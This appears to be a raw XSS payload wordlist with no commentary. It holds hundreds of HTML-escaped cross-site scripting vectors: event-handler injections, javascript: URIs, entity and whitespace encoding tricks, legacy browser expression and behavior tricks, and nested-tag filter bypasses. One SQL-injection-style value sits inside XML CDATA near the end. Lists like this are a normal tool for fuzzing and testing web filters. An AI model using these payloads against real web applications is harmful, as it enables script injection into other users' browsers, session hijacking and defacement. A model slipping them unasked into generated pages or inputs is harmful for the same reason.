"/&gt;&lt;img/onerror=\x60javascript:alert(1)\x60src=xxx:x /&gt;

"/&gt;&lt;img/onerror=\x20javascript:alert(1)\x20src=xxx:x /&gt;

&lt;script\x2F&gt;javascript:alert(1)&lt;/script&gt;

&lt;script\x20&gt;javascript:alert(1)&lt;/script&gt;

&lt;script\x0D&gt;javascript:alert(1)&lt;/script&gt;

&lt;script\x0A&gt;javascript:alert(1)&lt;/script&gt;

&lt;script\x0C&gt;javascript:alert(1)&lt;/script&gt;

&lt;script\x00&gt;javascript:alert(1)&lt;/script&gt;

&lt;script\x09&gt;javascript:alert(1)&lt;/script&gt;

`"'&gt;&lt;img src=xxx:x onerror\x0B=javascript:alert(1)&gt;

`"'&gt;&lt;img src=xxx:x onerror\x00=javascript:alert(1)&gt;

`"'&gt;&lt;img src=xxx:x onerror\x0C=javascript:alert(1)&gt;

`"'&gt;&lt;img src=xxx:x onerror\x0D=javascript:alert(1)&gt;

`"'&gt;&lt;img src=xxx:x onerror\x20=javascript:alert(1)&gt;

`"'&gt;&lt;img src=xxx:x onerror\x0A=javascript:alert(1)&gt;

`"'&gt;&lt;img src=xxx:x onerror\x09=javascript:alert(1)&gt;

&lt;script&gt;javascript:alert(1)&lt;\x00/script&gt;

&lt;img src=# onerror\x3D"javascript:alert(1)" &gt;

&lt;input onfocus=javascript:alert(1) autofocus&gt;

&lt;input onblur=javascript:alert(1) autofocus&gt;&lt;input autofocus&gt;

&lt;video poster=javascript:javascript:alert(1)//

&lt;body onscroll=javascript:alert(1)&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;...&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;...&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;...&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;...&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;...&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;input autofocus&gt;

&lt;form id=test onforminput=javascript:alert(1)&gt;&lt;input&gt;&lt;/form&gt;&lt;button form=test onformchange=javascript:alert(1)&gt;X

&lt;video&gt;&lt;source onerror="javascript:javascript:alert(1)"&gt;

&lt;video onerror="javascript:javascript:alert(1)"&gt;&lt;source&gt;

&lt;form&gt;&lt;button formaction="javascript:javascript:alert(1)"&gt;X

&lt;body oninput=javascript:alert(1)&gt;&lt;input autofocus&gt;

&lt;math href="javascript:javascript:alert(1)"&gt;CLICKME&lt;/math&gt;  &lt;math&gt; &lt;maction actiontype="statusline#http://google.com" 

xlink:href="javascript:javascript:alert(1)"&gt;CLICKME&lt;/maction&gt; &lt;/math&gt;

&lt;frameset onload=javascript:alert(1)&gt;

&lt;table background="javascript:javascript:alert(1)"&gt;

&lt;!--&lt;img src="--&gt;&lt;img src=x onerror=javascript:alert(1)//"&gt;

&lt;comment&gt;&lt;img src="&lt;/comment&gt;&lt;img src=x onerror=javascript:alert(1))//"&gt;

&lt;![&gt;&lt;img src="]&gt;&lt;img src=x onerror=javascript:alert(1)//"&gt;

&lt;style&gt;&lt;img src="&lt;/style&gt;&lt;img src=x onerror=javascript:alert(1)//"&gt;

&lt;li style=list-style:url() onerror=javascript:alert(1)&gt; &lt;div style=content:url(data:image/svg+xml,%%3Csvg/%%3E);visibility:hidden onload=javascript:alert(1)&gt;&lt;/div&gt;

&lt;head&gt;&lt;base href="javascript://"&gt;&lt;/head&gt;&lt;body&gt;&lt;a href="/. /,javascript:alert(1)//#"&gt;XXX&lt;/a&gt;&lt;/body&gt;

&lt;SCRIPT FOR=document EVENT=onreadystatechange&gt;javascript:alert(1)&lt;/SCRIPT&gt;

&lt;OBJECT CLASSID="clsid:333C7BC4-460F-11D0-BC04-0080C7055A83"&gt;&lt;PARAM NAME="DataURL" VALUE="javascript:alert(1)"&gt;&lt;/OBJECT&gt;

&lt;b &lt;script&gt;alert(1)&lt;/script&gt;0

&lt;div id="div1"&gt;&lt;input value="``onmouseover=javascript:alert(1)"&gt;&lt;/div&gt; &lt;div id="div2"&gt;&lt;/div&gt;&lt;script&gt;


&lt;x '="foo"&gt;&lt;x foo='&gt;&lt;img src=x onerror=javascript:alert(1)//'&gt;

&lt;embed src="javascript:alert(1)"&gt;

&lt;img src="javascript:alert(1)"&gt;

&lt;image src="javascript:alert(1)"&gt;

&lt;script src="javascript:alert(1)"&gt;

&lt;div style=width:1px;filter:glow onfilterchange=javascript:alert(1)&gt;x

&lt;? foo="&gt;&lt;script&gt;javascript:alert(1)&lt;/script&gt;"&gt;

&lt;! foo="&gt;&lt;script&gt;javascript:alert(1)&lt;/script&gt;"&gt;

&lt;/ foo="&gt;&lt;script&gt;javascript:alert(1)&lt;/script&gt;"&gt;

&lt;? foo="&gt;&lt;x foo='?&gt;&lt;script&gt;javascript:alert(1)&lt;/script&gt;'&gt;"&gt;

&lt;! foo="[[[Inception]]"&gt;&lt;x foo="]foo&gt;&lt;script&gt;javascript:alert(1)&lt;/script&gt;"&gt;

&lt;% foo&gt;&lt;x foo="%&gt;&lt;script&gt;javascript:alert(1)&lt;/script&gt;"&gt;

&lt;div id=d&gt;&lt;x xmlns="&gt;&lt;iframe onload=javascript:alert(1)"&gt;&lt;/div&gt; &lt;script&gt;d.innerHTML=d.innerHTML&lt;/script&gt;

&lt;img \x00src=x onerror="alert(1)"&gt;

&lt;img \x47src=x onerror="javascript:alert(1)"&gt;

&lt;img \x11src=x onerror="javascript:alert(1)"&gt;

&lt;img \x12src=x onerror="javascript:alert(1)"&gt;

&lt;img\x47src=x onerror="javascript:alert(1)"&gt;

&lt;img\x10src=x onerror="javascript:alert(1)"&gt;

&lt;img\x13src=x onerror="javascript:alert(1)"&gt;

&lt;img\x32src=x onerror="javascript:alert(1)"&gt;

&lt;img\x11src=x onerror="javascript:alert(1)"&gt;

&lt;img \x34src=x onerror="javascript:alert(1)"&gt;

&lt;img \x39src=x onerror="javascript:alert(1)"&gt;

&lt;img \x00src=x onerror="javascript:alert(1)"&gt;

&lt;img src\x09=x onerror="javascript:alert(1)"&gt;

&lt;img src\x10=x onerror="javascript:alert(1)"&gt;

&lt;img src\x13=x onerror="javascript:alert(1)"&gt;

&lt;img src\x32=x onerror="javascript:alert(1)"&gt;

&lt;img src\x12=x onerror="javascript:alert(1)"&gt;

&lt;img src\x11=x onerror="javascript:alert(1)"&gt;

&lt;img src\x00=x onerror="javascript:alert(1)"&gt;

&lt;img src\x47=x onerror="javascript:alert(1)"&gt;

&lt;img src=x\x09onerror="javascript:alert(1)"&gt;

&lt;img src=x\x10onerror="javascript:alert(1)"&gt;

&lt;img src=x\x11onerror="javascript:alert(1)"&gt;

&lt;img src=x\x12onerror="javascript:alert(1)"&gt;

&lt;img src=x\x13onerror="javascript:alert(1)"&gt;

&lt;img[a][b][c]src[d]=x[e]onerror=[f]"alert(1)"&gt;

&lt;img src=x onerror=\x09"javascript:alert(1)"&gt;

&lt;img src=x onerror=\x10"javascript:alert(1)"&gt;

&lt;img src=x onerror=\x11"javascript:alert(1)"&gt;

&lt;img src=x onerror=\x12"javascript:alert(1)"&gt;

&lt;img src=x onerror=\x32"javascript:alert(1)"&gt;

&lt;img src=x onerror=\x00"javascript:alert(1)"&gt;

&lt;a href=java&#1&#2&#3&#4&#5&#6&#7&#8&#11&#12script:javascript:alert(1)&gt;XXX&lt;/a&gt;

&lt;img src="x` `&lt;script&gt;javascript:alert(1)&lt;/script&gt;"` `&gt;

&lt;img src onerror /" '"= alt=javascript:alert(1)//"&gt;

&lt;title onpropertychange=javascript:alert(1)&gt;&lt;/title&gt;&lt;title title=&gt;

&lt;a href=http://foo.bar/#x=`y&gt;&lt;/a&gt;&lt;img alt="`&gt;&lt;img src=x:x onerror=javascript:alert(1)&gt;&lt;/a&gt;"&gt;

&lt;!--[if]&gt;&lt;script&gt;javascript:alert(1)&lt;/script --&gt;

&lt;!--[if&lt;img src=x onerror=javascript:alert(1)//]&gt; --&gt;

&lt;object id="x" classid="clsid:CB927D12-4FF7-4a9e-A169-56E4B8A75598"&gt;&lt;/object&gt; &lt;object classid="clsid:02BF25D5-8C17-4B23-BC80-D3488ABDDC6B" onqt_error="javascript:alert(1)" style="behavior:url(#x);"&gt;&lt;param name=postdomevents /&gt;&lt;/object&gt;

&lt;a style="-o-link:'javascript:javascript:alert(1)';-o-link-source:current"&gt;X

&lt;style&gt;p[foo=bar{}*{-o-link:'javascript:javascript:alert(1)'}{}*{-o-link-source:current}]{color:red};&lt;/style&gt;

&lt;link rel=stylesheet href=data:,*%7bx:expression(javascript:alert(1))%7d

&lt;style&gt;@import "data:,*%7bx:expression(javascript:alert(1))%7D";&lt;/style&gt;

&lt;a style="pointer-events:none;position:absolute;"&gt;&lt;a style="position:absolute;" onclick="javascript:alert(1);"&gt;XXX&lt;/a&gt;&lt;/a&gt;&lt;a 

href="javascript:javascript:alert(1)"&gt;XXX&lt;/a&gt;

&lt;// style=x:expression\28javascript:alert(1)\29&gt;

&lt;style&gt;*{x:ｅｘｐｒｅｓｓｉｏｎ(javascript:alert(1))}&lt;/style&gt;

&lt;div style="list-style:url(http://foo.f)\20url(javascript:javascript:alert(1));"&gt;X

&lt;x style="background:url('x&#1;;color:red;/*')"&gt;XXX&lt;/x&gt;

&lt;script&gt;({set/**/$($){_/**/setter=$,_=javascript:alert(1)}}).$=eval&lt;/script&gt;

&lt;script&gt;({0:#0=eval/#0#/#0#(javascript:alert(1))})&lt;/script&gt;

&lt;script&gt;ReferenceError.prototype.__defineGetter__('name', function(){javascript:alert(1)}),x&lt;/script&gt;



&lt;script&gt;Object.__noSuchMethod__ = Function,[{}][0].constructor._('javascript:alert(1)')()&lt;/script&gt;

&lt;meta charset="x-imap4-modified-utf7"&gt;&&lt;script&S1&TS&1&gt;alert&A7&(1)&R&UA;&&&lt;&A9&11/script&X&&gt;

&lt;meta charset="mac-farsi"&gt;¼script¾javascript:alert(1)¼/script¾


X&lt;x style=`behavior:url(#default#time2)` onbegin=`javascript:alert(1)` &gt;

1&lt;set/xmlns=`urn:schemas-microsoft-com:time` style=`beh&#x41vior:url(#default#time2)` attributename=`innerhtml` to=`&lt;img/src=&quot;x&quot;onerror=javascript:alert(1)&gt;`&gt;

1&lt;animate/xmlns=urn:schemas-microsoft-com:time style=behavior:url(#default#time2) attributename=innerhtml values=&lt;img/src=&quot;.&quot;onerror=javascript:alert(1)&gt;&gt;

1&lt;a href=#&gt;&lt;line xmlns=urn:schemas-microsoft-com:vml style=behavior:url(#default#vml);position:absolute href=javascript:javascript:alert(1) strokecolor=white strokeweight=1000px from=0 to=1000 /&gt;&lt;/a&gt;

&lt;a style="behavior:url(#default#AnchorClick);" folder="javascript:javascript:alert(1)"&gt;XXX&lt;/a&gt;

&lt;event-source src="%(event)s" onload="javascript:alert(1)"&gt;

&lt;a href="javascript:javascript:alert(1)"&gt;&lt;event-source src="data:application/x-dom-event-stream,Event:click%0Adata:XXX%0A%0A"&gt;

&lt;div id="x"&gt;x&lt;/div&gt; &lt;xml:namespace prefix="t"&gt; &lt;import namespace="t" implementation="#default#time2"&gt; &lt;t:set attributeName="innerHTML" targetElement="x" to="&lt;img&#11;src=x:x&#11;onerror&#11;=javascript:alert(1)&gt;"&gt;

&lt;script&gt;javascript:alert(1)&lt;/script&gt;

&lt;IMG SRC="javascript:javascript:alert(1);"&gt;

&lt;IMG SRC=javascript:javascript:alert(1)&gt;

&lt;IMG SRC=`javascript:javascript:alert(1)`&gt;

&lt;FRAMESET&gt;&lt;FRAME SRC="javascript:javascript:alert(1);"&gt;&lt;/FRAMESET&gt;

&lt;BODY ONLOAD=javascript:alert(1)&gt;

&lt;BODY ONLOAD=javascript:javascript:alert(1)&gt;

&lt;IMG SRC="jav    ascript:javascript:alert(1);"&gt;

&lt;BODY onload!#$%%&()*~+-_.,:;?@[/|\]^`=javascript:alert(1)&gt;

&lt;IMG SRC="javascript:javascript:alert(1)"

&lt;INPUT TYPE="IMAGE" SRC="javascript:javascript:alert(1);"&gt;

&lt;IMG DYNSRC="javascript:javascript:alert(1)"&gt;

&lt;IMG LOWSRC="javascript:javascript:alert(1)"&gt;

&lt;BGSOUND SRC="javascript:javascript:alert(1);"&gt;

&lt;BR SIZE="&{javascript:alert(1)}"&gt;

&lt;LINK REL="stylesheet" HREF="javascript:javascript:alert(1);"&gt;

&lt;META HTTP-EQUIV="refresh" CONTENT="0;url=javascript:javascript:alert(1);"&gt;

&lt;META HTTP-EQUIV="refresh" CONTENT="0; URL=http://;URL=javascript:javascript:alert(1);"&gt;

&lt;IFRAME SRC="javascript:javascript:alert(1);"&gt;&lt;/IFRAME&gt;

&lt;TABLE BACKGROUND="javascript:javascript:alert(1)"&gt;

&lt;TABLE&gt;&lt;TD BACKGROUND="javascript:javascript:alert(1)"&gt;

&lt;DIV STYLE="background-image: url(javascript:javascript:alert(1))"&gt;

&lt;DIV STYLE="width:expression(javascript:alert(1));"&gt;

&lt;STYLE TYPE="text/javascript"&gt;javascript:alert(1);&lt;/STYLE&gt;

&lt;STYLE type="text/css"&gt;BODY{background:url("javascript:javascript:alert(1)")}&lt;/STYLE&gt;

&lt;!--[if gte IE 4]&gt;&lt;SCRIPT&gt;javascript:alert(1);&lt;/SCRIPT&gt;&lt;![endif]--&gt;

&lt;BASE HREF="javascript:javascript:alert(1);//"&gt;

&lt;OBJECT classid=clsid:ae24fdae-03c6-11d1-8b76-0080c744f389&gt;&lt;param name=url value=javascript:javascript:alert(1)&gt;&lt;/OBJECT&gt;

&lt;form id="test" /&gt;&lt;button form="test" formaction="javascript:javascript:alert(1)"&gt;X

&lt;body onscroll=javascript:alert(1)&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;input autofocus&gt;

&lt;P STYLE="behavior:url('#default#time2')" end="0" onEnd="javascript:alert(1)"&gt;

&lt;STYLE&gt;a{background:url('s1' 's2)}@import javascript:javascript:alert(1);');}&lt;/STYLE&gt;

&lt;meta charset= "x-imap4-modified-utf7"&&&gt;&&&lt;script&&&gt;javascript:alert(1)&&;&&&lt;&&/script&&&gt;

&lt;SCRIPT onreadystatechange=javascript:javascript:alert(1);&gt;&lt;/SCRIPT&gt;

&lt;style onreadystatechange=javascript:javascript:alert(1);&gt;&lt;/style&gt;

&lt;?xml version="1.0"?&gt;&lt;html:html xmlns:html='http://www.w3.org/1999/xhtml'&gt;&lt;html:script&gt;javascript:alert(1);&lt;/html:script&gt;&lt;/html:html&gt;

&lt;embed code=javascript:javascript:alert(1);&gt;&lt;/embed&gt;

&lt;frameset onload=javascript:javascript:alert(1)&gt;&lt;/frameset&gt;

&lt;object onerror=javascript:javascript:alert(1)&gt;

&lt;XML ID=I&gt;&lt;X&gt;&lt;C&gt;&lt;![CDATA[&lt;IMG SRC="javas]]&lt;![CDATA[cript:javascript:alert(1);"&gt;]]&lt;/C&gt;&lt;X&gt;&lt;/xml&gt;

&lt;IMG SRC=&{javascript:alert(1);};&gt;

&lt;a href="jav&#65ascript:javascript:alert(1)"&gt;test1&lt;/a&gt;

&lt;a href="jav&#97ascript:javascript:alert(1)"&gt;test1&lt;/a&gt;

&lt;iframe srcdoc="&LT;iframe&sol;srcdoc=&amp;lt;img&sol;src=&amp;apos;&amp;apos;onerror=javascript:alert(1)&amp;gt;&gt;"&gt;

&lt;iframe %00 src="&Tab;javascript:prompt(1)&Tab;"%00&gt;

&lt;svg&gt;&lt;style&gt;{font-family&colon;'&lt;iframe/onload=confirm(1)&gt;'

&lt;input/onmouseover="javaSCRIPT&colon;confirm&lpar;1&rpar;"

&lt;sVg&gt;&lt;scRipt %00&gt;alert&lpar;1&rpar; {Opera}

&lt;img/src=`%00` onerror=this.onerror=confirm(1)

&lt;form&gt;&lt;isindex formaction="javascript&colon;confirm(1)"

&lt;img src=`%00`&NewLine; onerror=alert(1)&NewLine;

&lt;ScRipT 5-0*3+9/3=&gt;prompt(1)&lt;/ScRipT giveanswerhere=?

&lt;script /*%00*/&gt;/*%00*/alert(1)/*%00*/&lt;/script /*%00*/

&#34;&#62;&lt;h1/onmouseover='\u0061lert(1)'&gt;%00

&lt;iframe/src="data:text/html,&lt;svg &#111;&#110;load=alert(1)&gt;"&gt;

&lt;meta content="&NewLine; 1 &NewLine;; JAVASCRIPT&colon; alert(1)" http-equiv="refresh"/&gt;

&lt;meta http-equiv="refresh" content="0;url=javascript:confirm(1)"&gt;

&lt;form&gt;&lt;a href="javascript:\u0061lert&#x28;1&#x29;"&gt;X

&lt;/script&gt;&lt;img/*%00/src="worksinchrome&colon;prompt&#x28;1&#x29;"/%00*/onerror='eval(src)'&gt;

&lt;img/&#09;&#10;&#11; src=`~` onerror=prompt(1)&gt;

&lt;form&gt;&lt;iframe &#09;&#10;&#11; src="javascript&#58;alert(1)"&#11;&#10;&#09;;&gt;

&lt;a&#32;href&#61;&#91;&#00;&#93;"&#00; onmouseover=prompt&#40;1&#41;&#47;&#47;"&gt;XYZ&lt;/a

&#00;&lt;/form&gt;&lt;input type&#61;"date" onfocus="alert(1)"&gt;

&lt;form&gt;&lt;textarea &#13; onkeyup='\u0061\u006C\u0065\u0072\u0074&#x28;1&#x29;'&gt;

&lt;iframe srcdoc='&lt;body onload=prompt&lpar;1&rpar;&gt;'&gt;

&lt;a href="javascript:void(0)" onmouseover=&NewLine;javascript:alert(1)&NewLine;&gt;X&lt;/a&gt;

&lt;style/onload=&lt;!--&#09;&gt;&#10;alert&#10;&lpar;1&rpar;&gt;

&lt;///style///&gt;&lt;span %2F onmousemove='alert&lpar;1&rpar;'&gt;SPAN

&lt;img/src='http://i.imgur.com/P8mL8.jpg' onmouseover=&Tab;prompt(1)

&#34;&#62;&lt;svg&gt;&lt;style&gt;{-o-link-source&colon;'&lt;body/onload=confirm(1)&gt;'

&#13;&lt;blink/&#13; onmouseover=pr&#x6F;mp&#116;(1)&gt;OnMouseOver {Firefox & Opera}

&lt;marquee onstart='javascript:alert&#x28;1&#x29;'&gt;^__^

&lt;div/style="width:expression(confirm(1))"&gt;X&lt;/div&gt; {IE7}

&lt;iframe/%00/ src=javaSCRIPT&colon;alert(1)

/*iframe/src*/&lt;iframe/src="&lt;iframe/src=@"/onload=prompt(1) /*iframe/src*/&gt;

&lt;/font&gt;/&lt;svg&gt;&lt;style&gt;{src&#x3A;'&lt;style/onload=this.onload=confirm(1)&gt;'&lt;/font&gt;/&lt;/style&gt;


&lt;a/href="javascript:&#13; javascript:prompt(1)"&gt;&lt;input type="X"&gt;

&lt;/plaintext\&gt;&lt;/|\&gt;&lt;plaintext/onmouseover=prompt(1)

&lt;/svg&gt;''&lt;svg&gt;&lt;script 'AQuickBrownFoxJumpsOverTheLazyDog'&gt;alert&#x28;1&#x29; {Opera}

&lt;a href="javascript&colon;\u0061&#x6C;&#101%72t&lpar;1&rpar;"&gt;&lt;button&gt;

&lt;div onmouseover='alert&lpar;1&rpar;'&gt;DIV&lt;/div&gt;

&lt;iframe style="position:absolute;top:0;left:0;width:100%;height:100%" onmouseover="prompt(1)"&gt;

&lt;a href="jAvAsCrIpT&colon;alert&lpar;1&rpar;"&gt;X&lt;/a&gt;

&lt;var onmouseover="prompt(1)"&gt;On Mouse Over&lt;/var&gt;

&lt;img src="/" =_=" title="onerror='prompt(1)'"&gt;

&lt;%&lt;!--'%&gt;&lt;script&gt;alert(1);&lt;/script --&gt;

&lt;script src="data:text/javascript,alert(1)"&gt;&lt;/script&gt;

&lt;iframe/src \/\/onload = prompt(1)

&lt;iframe/onreadystatechange=alert(1)

&lt;svg/onload=alert(1)

&lt;input value=&lt;&gt;&lt;iframe/src=javascript:confirm(1)

&lt;input type="text" value=`` &lt;div/onmouseover='alert(1)'&gt;X&lt;/div&gt;

http://www.&lt;script&gt;alert(1)&lt;/script .com

&lt;iframe src=j&NewLine;&Tab;a&NewLine;&Tab;&Tab;v&NewLine;&Tab;&Tab;&Tab;a&NewLine;&Tab;&Tab;&Tab;&Tab;s&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;c&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;r&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;i&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;p&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;t&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&colon;a&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;l&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;e&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;r&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;t&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;28&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;1&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;%29&gt;&lt;/iframe&gt;

&lt;svg&gt;&lt;script ?&gt;alert(1)

&lt;iframe src=j&Tab;a&Tab;v&Tab;a&Tab;s&Tab;c&Tab;r&Tab;i&Tab;p&Tab;t&Tab;:a&Tab;l&Tab;e&Tab;r&Tab;t&Tab;%28&Tab;1&Tab;%29&gt;&lt;/iframe&gt;

&lt;img src=`xx:xx`onerror=alert(1)&gt;

&lt;meta http-equiv="refresh" content="0;javascript&colon;alert(1)"/&gt;

&lt;svg contentScriptType=text/vbs&gt;&lt;script&gt;MsgBox+1

&lt;a href="data:text/html;base64_,&lt;svg/onload=\u0061&#x6C;&#101%72t(1)&gt;"&gt;X&lt;/a

&lt;object data=javascript&colon;\u0061&#x6C;&#101%72t(1)&gt;

&lt;script&gt;+-+-1-+-+alert(1)&lt;/script&gt;

&lt;body/onload=&lt;!--&gt;&#10alert(1)&gt;

&lt;script itworksinallbrowsers&gt;/*&lt;script* */alert(1)&lt;/script

&lt;img src ?itworksonchrome?\/onerror = alert(1)

&lt;svg&gt;&lt;script&gt;//&NewLine;confirm(1);&lt;/script &lt;/svg&gt;

&lt;svg&gt;&lt;script onlypossibleinopera:-)&gt; alert(1)

&lt;a aa aaa aaaa aaaaa aaaaaa aaaaaaa aaaaaaaa aaaaaaaaa aaaaaaaaaa href=j&#97v&#97script&#x3A;&#97lert(1)&gt;ClickMe

&lt;script x&gt; alert(1) &lt;/script 1=2

&lt;div/onmouseover='alert(1)'&gt; style="x:"&gt;

&lt;--`&lt;img/src=` onerror=alert(1)&gt; --!&gt;

&lt;script/src=&#100&#97&#116&#97:text/&#x6a&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x000070&#x074,&#x0061;&#x06c;&#x0065;&#x00000072;&#x00074;(1)&gt;&lt;/script&gt;

&lt;div style="position:absolute;top:0;left:0;width:100%;height:100%" onmouseover="prompt(1)" onclick="alert(1)"&gt;x&lt;/button&gt;

&lt;form&gt;&lt;button formaction=javascript&colon;alert(1)&gt;CLICKME

‘; alert(1);

‘)alert(1);//

&lt;ScRiPt&gt;alert(1)&lt;/sCriPt&gt;

&lt;img src=xss onerror=alert(1)&gt;

&lt;iframe style="xg-p:absolute;top:0;left:0;width:100%;height:100%" onmouseover="prompt(1)"&gt;

&lt;div style="xg-p:absolute;top:0;left:0;width:100%;height:100%" onmouseover="prompt(1)" onclick="alert(1)"&gt;x&lt;/button&gt;

%253cscript%253ealert(1)%253c/script%253e

foo&lt;script&gt;alert(1)&lt;/script&gt;

&lt;scr&lt;script&gt;ipt&gt;alert(1)&lt;/scr&lt;/script&gt;ipt&gt;

&lt;? foo="&gt;&lt;script&gt;alert(1)&lt;/script&gt;"&gt;

&lt;! foo="&gt;&lt;script&gt;alert(1)&lt;/script&gt;"&gt;

&lt;/ foo="&gt;&lt;script&gt;alert(1)&lt;/script&gt;"&gt;

&lt;? foo="&gt;&lt;x foo='?&gt;&lt;script&gt;alert(1)&lt;/script&gt;'&gt;"&gt;

&lt;! foo="[[[Inception]]"&gt;&lt;x foo="]foo&gt;&lt;script&gt;alert(1)&lt;/script&gt;"&gt;

&lt;script&gt;Object.__noSuchMethod__ = Function,[{}][0].constructor._('alert(1)')()&lt;/script&gt;

&lt;script src="#"&gt;{alert(1)}&lt;/script&gt;;1

&lt;script&gt;crypto.generateCRMFRequest('CN=0',0,0,null,'alert(1)',384,null,'rsa-dual-use')&lt;/script&gt;

&lt;svg xmlns="#"&gt;&lt;script&gt;alert(1)&lt;/script&gt;&lt;/svg&gt;

&lt;iframe xmlns="#" src="javascript:alert(1)"&gt;&lt;/iframe&gt;

&lt;script&gt;alert(1)&lt;/script&gt;

&lt;video src=1 onerror=alert(1)&gt;

&lt;audio src=1 onerror=alert(1)&gt;

0\"autofocus/onfocus=alert(1)--&gt;&lt;video/poster/onerror=prompt(2)&gt;"-confirm(3)-"

0\"autofocus/onfocus=alert(1)--&gt;&lt;video/poster/ error=prompt(2)&gt;"-confirm(3)-"

&lt;script&gt;for((i)in(self))eval(i)(1)&lt;/script&gt;

&lt;scr&lt;script&gt;ipt&gt;alert(1)&lt;/scr&lt;/script&gt;ipt&gt;&lt;scr&lt;script&gt;ipt&gt;alert(1)&lt;/scr&lt;/script&gt;ipt&gt;

&lt;sCR&lt;script&gt;iPt&gt;alert(1)&lt;/SCr&lt;/script&gt;IPt&gt;

&lt;META onpaonpageonpagonpageonpageshowshoweshowshowgeshow="alert(1)";

&lt;iframe  src="&Tab;javascript:prompt(1)&Tab;"&gt;

&lt;sVg&gt;&lt;scRipt &gt;alert&lpar;1&rpar; {Opera}

&lt;img/src=`` onerror=this.onerror=confirm(1)

&lt;img src=``&NewLine; onerror=alert(1)&NewLine;

&lt;script /**/&gt;/**/alert(1)/**/&lt;/script /**/

&#34;&#62;&lt;h1/onmouseover='\u0061lert(1)'&gt;

&lt;form&gt;&lt;a href="javascript:\u0061lert&#x28;1&#x29;"&gt;X&lt;/script&gt;&lt;img/*/src="worksinchrome&colon;prompt&#x28;1&#x29;"/*/onerror='eval(src)'&gt;

&lt;iframe// src=javaSCRIPT&colon;alert(1)

"&gt;&lt;img src=x onerror=javascript:alert(1)&gt;

"&gt;&lt;img src=x onerror=javascript:alert('1')&gt;

"&gt;&lt;img src=x onerror=javascript:alert("1")&gt;

"&gt;&lt;img src=x onerror=javascript:alert(`1`)&gt;

"&gt;&lt;img src=x onerror=javascript:alert(('1'))&gt;

"&gt;&lt;img src=x onerror=javascript:alert(("1"))&gt;

"&gt;&lt;img src=x onerror=javascript:alert((`1`))&gt;

&lt;IMG SRC="jav ascript:javascript:alert(1);"&gt;

&lt;/script&gt;&lt;img/*/src="worksinchrome&colon;prompt&#x28;1&#x29;"/*/onerror='eval(src)'&gt;

&lt;script&gt;alert(1);&lt;/script&gt;

"/&gt;&lt;/a&gt;&lt;/&gt;&lt;img src=1.gif onerror=alert(1)&gt;

&lt;div style="x:expression((window.r==1)?'':eval('r=1;

&lt;script&gt;var var = 1; alert(var)&lt;/script&gt;

&lt;scrscriptipt&gt;alert(1)&lt;/scrscriptipt&gt;

&lt;/script&gt;&lt;script&gt;alert(1)&lt;/script&gt;

1script3document.vulnerable=true;1/script3

&lt;div STYLE="background-image: url(&#1;javascript:document.vulnerable=true;)"&gt;

&lt;;/script&gt;;&lt;;script&gt;;alert(1)&lt;;/script&gt;;

&lt;;scrscriptipt&gt;;alert(1)&lt;;/scrscriptipt&gt;;

&lt;?xml version="1.0" encoding="ISO-8859-1"?&gt;&lt;foo&gt;&lt;![CDATA[&lt;]]&gt;SCRIPT&lt;![CDATA[&gt;]]&gt;alert('gotcha');&lt;![CDATA[&lt;]]&gt;/SCRIPT&lt;![CDATA[&gt;]]&gt;&lt;/foo&gt;

&lt;?xml version="1.0" encoding="ISO-8859-1"?&gt;&lt;foo&gt;&lt;![CDATA[' or 1=1 or ''=']]&gt;&lt;/foof&gt;

